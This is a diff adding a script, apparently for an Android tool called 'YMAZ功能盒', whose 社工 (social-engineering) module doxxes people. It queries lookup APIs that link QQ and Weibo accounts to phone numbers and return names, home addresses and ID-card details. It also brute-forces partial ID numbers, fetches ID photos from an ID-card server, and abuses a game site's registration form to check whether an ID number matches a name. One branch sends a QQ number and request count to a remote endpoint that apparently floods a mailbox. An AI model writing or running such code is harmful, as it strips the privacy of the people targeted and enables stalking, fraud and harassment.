@@ -1,0 +1,496 @@
+fn 跑线()
+ug(230,"text",d)
+sgsz(sss.c,d,e)
+sj(e,"&gt;","地市",sss.i)
+ug(228,"text",a)
+ug(230,"text",sss.sz)
+ss("/storage/emulated/0/YMAZ功能盒/社工/"+sss.hou+".txt",gg)
+fr(gg,g)
+f(a&lt;9)
+{
+s+(a,1,b)
+ss("0"+b,c)
+ufnsui()
+{
+us(228,"visibility","visible")
+us(228,"text",c)
+ss(sss.i+c,cc)
+ss(g+"\n"+cc+sss.hr,cc)
+ss("/storage/emulated/0/YMAZ功能盒/社工/"+sss.hou+".txt",gg)
+fw(gg,cc)
+fn 社工代码.跑线()
+}
+}
+else f(a&lt;99)
+{
+s+(a,1,b)
+ufnsui()
+{
+us(228,"text",b)
+ss(sss.i+b,cc)
+ss(g+"\n"+cc+sss.hr,cc)
+ss("/storage/emulated/0/YMAZ功能盒/社工/"+sss.hou+".txt",gg)
+fw(gg,cc)
+fn 社工代码.跑线()
+}
+}
+else f(a==99)
+{
+ufnsui()
+{
+us(228,"text","-1")
+s+(d,1,c)
+us(230,"text",c)
+sss m=c
+fn 社工代码.判断()
+syso(sss.shu)
+syso(sss.sz)
+}
+}
+else
+{
+ufnsui()
+{
+tw("完成")
+}
+}
+end fn
+fn 社工()
+f(ss.社工==0)
+{
+fn 社工命令.基本信息()
+dhas(dh, 189, "translationY", 0, -1000, -30, -10, 0)
+dh(dh, "duration", 1000)
+dh(dh, "start")
+t()
+{
+stop(300)
+ufnsui()
+{
+us(188,"visibility","gone")
+}
+}
+dhas(dh, 21, "translationY", -60, 0, -30, -10, 0)
+dh(dh, "duration", 2000)
+dh(dh, "start")
+}
+else f(ss.社工==1)
+{
+t()
+{
+ss("https://zy.xywlapi.cc/wbphone?phone="+sss.qq,a)
+hs(a,null,"utf-8", null, true, "User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||accept=*/*||accept-language=zh-CN",b)
+ufnsui()
+{
+us(221,"text",b)
+endutw()
+}
+}
+}
+else f(ss.社工==2)
+{
+t()
+{
+ss("https://zy.xywlapi.cc/qqapi?qq="+sss.qq,a)
+hs(a,null,"utf-8", null, true, "User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||accept=*/*||accept-language=zh-CN",b)
+json(b,jo)
+json(jo,"get","message",判断)
+json(jo,"get","qq",账号)
+json(jo,"get","phone",手机号)
+json(jo,"get","phonediqu",归属地)
+endutw()
+f(判断=="查询成功")
+{
+ufnsui()
+{
+ss("查询账号:"+账号+"\n"+"绑定手机号:"+手机号+"\n"+"历史归属地:"+归属地,qbxx)
+us(221,"text",qbxx)
+}
+}
+else
+{
+ufnsui()
+{
+ss("未找到账号"+sss.qq+"的相关信息",wzd)
+us(221,"text",wzd)
+}
+}
+}
+}
+else f(ss.社工==3)
+{
+t()
+{
+ss("https://zy.xywlapi.cc/qqphone?phone="+sss.qq,a)
+hs(a,null,"utf-8", null, true, "User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||accept=*/*||accept-language=zh-CN",b)
+json(b,jo)
+json(jo,"get","message",判断)
+json(jo,"get","qq",账号)
+json(jo,"get","phone",手机号)
+json(jo,"get","phonediqu",归属地)
+endutw()
+f(判断=="查询成功")
+{
+ufnsui()
+{
+ss("绑定账号QQ为:"+账号+"\n"+"查询账号为:"+sss.qq+"\n"+"历史归属地:"+归属地,qbxx)
+us(221,"text",qbxx)
+}
+}
+else
+{
+ufnsui()
+{
+ss("未找到账号"+sss.qq+"的相关信息",wzd)
+us(221,"text",wzd)
+}
+}
+}
+}
+else f(ss.社工==4)
+{
+t()
+{
+ss("https://v.api.aa1.cn/api/phone/guishu-api.php?phone="+sss.qq,a)
+hs(a,null,"utf-8", null, true, "User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||accept=*/*||accept-language=zh-CN",b)
+json(b,b)
+endutw()
+ufnsui()
+{
+us(221,"text",b)
+}
+}
+}
+else f(ss.社工==5)
+{
+t()
+{
+ss("https://www.ip.cn/api/index?ip="+sss.qq+"&type=0",a)
+hs(a,null,"utf-8", null, true, "User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||accept=*/*||accept-language=zh-CN",b)
+json(a,b)
+json(b,"get","code",code)
+json(b,"get","address",address)
+ss("code："+code+"\n定位："+address)
+endutw()
+ufnsui()
+{
+us(221,"text",c)
+}
+}
+}
+else f(ss.社工==6)
+{
+t()
+{
+ss("http://usdtabcd.cn/login/gn/qqhz.php?username="+sss.user+"&password="+sss.pass+"&qq="+sss.qq+"&num_requests="+sss.sfz,a)
+hs(a,null,"utf-8", null, true, "User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||accept=*/*||accept-language=zh-CN",b)
+endutw()
+ufnsui()
+{
+us(221,"text","结果："+b+"\n邮箱延迟可能会有10-30分钟，请耐心等待...")
+}
+}
+}
+else f(ss.社工==7)
+{
+us(224,"visibility","visible")
+endutw()
+sran(10,999,suiji1)
+sran(10,999,suiji2)
+sran(10,999,suiji3)
+sran(10,999,suiji4)
+ss(suiji1+"."+suiji2+"."+suiji3+"."+suiji4+":"+"80",sss.ip)
+syso(sss.ip)
+sran(100000000,9999999999999999,f)
+ss("name="+f+"&password=zLevap9Nf3&repassword=zLevap9Nf3&rname="+sss.qq+"&idcard="+sss.sfz+"&formtype=registerform&from=3841",c)
+t()
+{
+hs("http://web.7k7k.com/source/Post.php",c,"utf-8",sss.ip,e)
+json(e,jo)
+syso(jo)
+json(jo,"get","info",h)
+f(h?"成功")
+{
+ufnsui()
+{
+us(221,"text","身份证匹配验证成功！")
+}
+}
+else f(h?"太多了")
+{
+ufnsui()
+{
+us(221,"text","频繁验证请稍等再试吧")
+}
+}
+else f(h?"已存在")
+{
+ufnsui()
+{
+us(221,"text","身份证匹配验证成功！")
+}
+}
+else
+{
+ufnsui()
+{
+us(221,"text",h)
+}
+}
+}
+}
+else f(ss.社工==8)
+{
+stobm(sss.hou, "utf-8", dq)
+ss("https://www.chahaoba.cn/city-3-digitals/"+sss.hou+"/"+sss.qq,a)
+syso(a)
+t()
+{
+hs(a,b)
+sutf8to(b,b)
+sj(b," &lt;td  class=\"views-field views-field-title\"&gt;","&lt;/div&gt;",b)
+sr(b,"\n","",b)
+sr(b,"&lt;td  class=\"views-field views-field-field-city\"&gt;,"",b)
+sr(b,"&lt;/td&gt;                  &lt;td  class=\"views-field views-field-field-city\"&gt;            &lt;a href=\","",b)
+sr(b," ","",b)
+sr(b,"typeof=\"skos:Concept\"property=\"rdfs:labelskos:prefLabel\"datatype=\"\"&gt;","",b)
+sr(b,"&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;trclass=\"even\"&gt;&lt;tdclass=\"views-fieldviews-field-title\"&gt;","",b)
+sr(b,"&lt;/a&gt;&lt;/td&gt;&lt;tdclass=\"views-fieldviews-field-field-city\"&gt;&lt;ahref=\"/","",b)
+sr(b,"&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;trclass=\"odd\"&gt;&lt;tdclass=\"views-fieldviews-field-title\"&gt;","",b)
+sr(b,"&lt;ahref=\"/mobile/","\n",b)
+sr(b,"&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;trclass=\"oddviews-row-last\"&gt;&lt;tdclass=\"views-fieldviews-field-title\"&gt;","",b)
+sr(b,"&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;","",b)
+sl(b,"\n",sss.c)
+ug(230,"text",sz)
+sgszl(sss.c,shu)
+ufnsui()
+{
+endutw()
+s+(shu,1,shu)
+ss("共"+shu+"组数据正在加载",sj)
+us(221,"text",sj)
+}
+s-(shu,1,shu)
+sss sz=sz
+sss shu=shu
+fn 社工代码.跑线()
+}
+}
+else f(ss.社工==9)
+{
+endutw()
+uigo("身份证前六位.iyu")
+}
+else f(ss.社工==10)
+{
+t()
+{
+stobm(sss.qq, "utf-8", sss.qq)
+hs("http://www.zyjpp.site/zyjsg/hsw.php",a)
+sj(a,"sj=",null,a)
+ss("http://sszs.wxsszs.cn/api/jk/sfzpxjk.php?sj="+a+"&name="+sss.qq+"AA&num="+sss.sfz,b)
+ss("http://sszs.wxsszs.cn/api/jk/sfzhd.php?sj="+a+"&num="+sss.sfz+"&xb="+sss.qq,bb)
+hs(b,c)
+endutw()
+sr(c,"随身助手","照妖镜",c)
+f(c?"失败")
+{
+hs(bb,c)
+}
+ufnsui()
+{
+sl(c,"&lt;br&gt;",sss.sz1)
+sgszl(sss.sz1,sss.cc)
+sss sfzpd=-1
+fn 社工代码.身份证判断()
+}
+}
+}
+else f(ss.社工==11)
+{
+t()
+{
+ss("http://www.zyjpp.site/sgzyj/sjkcx.php?name="+sss.qq,a)
+hs(a,b)
+call(source,"mjava","unicode.decode",b)
+sr(source,"name","姓名",source)
+sr(source,"alt_phone","备用号码",source)
+sr(source,"phone","■手机号",source)
+sr(source,"■","\n",source)
+sr(source,"address","家庭住址",source)
+sr(source,"province","省区",source)
+sr(source,"city","市区",source)
+sr(source,"\"","",source)
+sr(source,"status:10}","\n",source)
+sr(source,",","",source)
+sj(source,"[{","]",source)
+endutw()
+ufnsui()
+{
+us(221,"text",source)
+}
+}
+}
+else f(ss.社工==12)
+{
+t()
+{
+hs("http://www.zyjpp.site/zyjsg/sys.php",a)
+ufnsui()
+{
+endutw()
+us(221,"text",a)
+}
+}
+}
+else f(ss.社工==13)
+{
+t()
+{
+ss("https://free.wqwlkj.cn/wqwlapi/sfz.php?number="+sss.qq,a)
+hs(a,b)
+sj(b,"{","}",b)
+endutw()
+ufnsui()
+{
+us(221,"text",b)
+}
+}
+}
+else f(ss.社工==14)
+{
+ss("https://sp0.baidu.com/8aQDcjqpAAV3otqbppnN2DJv/api.php?resource_id=6899&query=%E5%A4%B1%E4%BF%A1%E4%BA%BA%E5%90%8D%E5%8D%95"+sss.qq,a)
+t()
+{
+ss("{\"url\":\""+a+"\",\"pachong\":\"baidu\"}",b)
+hs("https://3389x.com/spider/post", b, "utf-8", c)
+json(c,c)
+json(c,"get","rid",c)
+ss("https://3389x.com/spider/get_result/"+c,sss.c)
+fn 社工代码.老赖()
+endutw()
+}
+}
+else f(ss.社工==15)
+{
+t()
+{
+ss("http://www.zyjpp.site/zyjsg/lm.php?msg="+sss.qq+"&key=zyjpp",a)
+hs(a,null,"utf-8", null, true, "User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||accept=*/*||accept-language=zh-CN",b)
+endutw()
+f(b?"照妖镜")
+{
+ufnsui()
+{
+us(221,"text",b)
+}
+}
+else
+{
+ufnsui()
+{
+us(39,"text","失效请联系YMAZ功能盒作者")
+}
+}
+}
+}
+else f(ss.社工==16)
+{
+t()
+{
+ss("https://wx.rd-ic.com:8093/sscard-server/getGAPhoto.html?idcard="+sss.sfz+"&name="+sss.qq,a)
+hs(a,b)
+json(b,jo)
+json(jo,"get","photo",base64)
+loadjar("NightSky.dex",dex)
+cls(dex,"com.nightsky.NightSkyUtil",c)
+javax(bitmaps,null,c,"StringtoBitmap","String",base64)
+endutw()
+f(bitmaps==null)
+{
+ufnsui()
+{
+fn tw.tw("借口失效或信息错误",2)
+}
+}
+else
+{
+ufnsui()
+{
+us(306,"src",bitmaps)
+}
+}
+}
+}
+else f(ss.社工==99)
+{
+  endutw()
+  uigo("北京sfz.iyu")
+}
+end fn
+fn 判断()
+f(sss.sz&gt;=sss.shu)
+{
+ufnsui()
+{
+fn tw.tw("结束",0)
+}
+}
+else
+{
+ufnsui()
+{
+fn 社工代码.跑线()
+}
+}
+end fn
+fn 身份证判断()
+f(sss.sfzpd&gt;sss.cc)
+{
+ufnsui()
+{
+fn tw.tw("存放YMAZ功能盒路\n径或点击复制",0)
+}
+}
+else
+{
+s+(sss.sfzpd,1,sss.sfzpd)
+sgsz(sss.sz1,sss.sfzpd,b)
+sj(b,")","[",c)
+fr("/storage/emulated/0/YMAZ功能盒/社工/身份证补齐.txt",z)
+ufnsui()
+{
+ss(z+c,h)
+ss(h+"\n",c)
+fw("/storage/emulated/0/YMAZ功能盒/社工/身份证补齐.txt",c)
+ss(c+"\n",f)
+us(221,"text",f)
+fn 社工代码.身份证判断()
+}
+}
+end fn
+fn 老赖()
+hs(sss.c,c)
+json(c,sss.pc)
+json(sss.pc,"get","s",c)
+f(c!="200")
+{
+fn 社工代码.老赖()
+}
+else
+{
+json(sss.pc,"get","url",c)
+ss("https://3389x.com"+c,c)
+t()
+{
+hs(c,c)
+sj(c,"resource_id=6899\"/&gt;",null,c)
+json(c,jo)
+ufnsui()
+{
+sr(jo,"失信","老赖",list)
+us(221,"text",list)
+}
+}
+}
+end fn
